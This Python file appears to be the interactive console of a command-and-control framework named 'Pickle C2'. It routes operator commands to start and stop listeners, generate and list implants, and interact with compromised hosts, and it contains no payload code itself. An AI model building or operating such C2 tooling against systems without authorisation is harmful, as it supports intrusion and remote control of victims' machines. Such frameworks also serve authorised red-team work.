from Core import color, database, helper
from functions import listenerfunctions, implantfunctions, interactfunctions



def interact_menu(conn,command):

	results = database.return_key(conn,command.split()[1])

	if results:
		interactfunctions.interact(conn,command)
	else:
		print ("[%s] %s Implant NOT FOUND!" % (color.red("-"),command.split()[1]))

def implant_menu(conn,command):

	if command[:16] == "implant generate":

		implantfunctions.GenerateImplant(conn,command)

	elif command == "implant list":

		implantfunctions.ListImplant(conn)

def listener_menu(conn,command):

	if command[:14] == "listener start":

		listenerfunctions.StartListener(command,conn)

	elif command[:13] == "listener stop":

		listenerfunctions.StopListener(command,conn)

	elif command[:13] == "listener load":

		listenerfunctions.ReloadListener(conn)

	elif command[:13] == "listener list":

		listenerfunctions.ListListener(conn)

def start(conn):


	while True:

		command = input("[%s%s%s]%s " % (color.red("Pickle"),color.yellow("@"),color.cyan("C2"),color.yellow("::>"))).strip()

		if command == "help":

			print ("\n%s\n" % helper.help())

		elif command == "help listener":

			print ("\n%s\n" % helper.help_listener())

		elif command == "help implant":

			print ("\n%s\n" % helper.help_implant())

		elif command == "help interact":

			print ("\n%s\n" % helper.help_interact())

		elif command == "list listener":

			print ("\n%s\n" % helper.list_listener_option())

		elif command == "list implant":

			print ("\n%s\n" % helper.list_implant_lang())

		elif command[:8] == "listener":

			listener_menu(conn,command)

		elif command[:7] == "implant":

			implant_menu(conn,command)


		elif command[:8] == "interact":

			interact_menu(conn,command)

		elif command == "exit":
			exit()
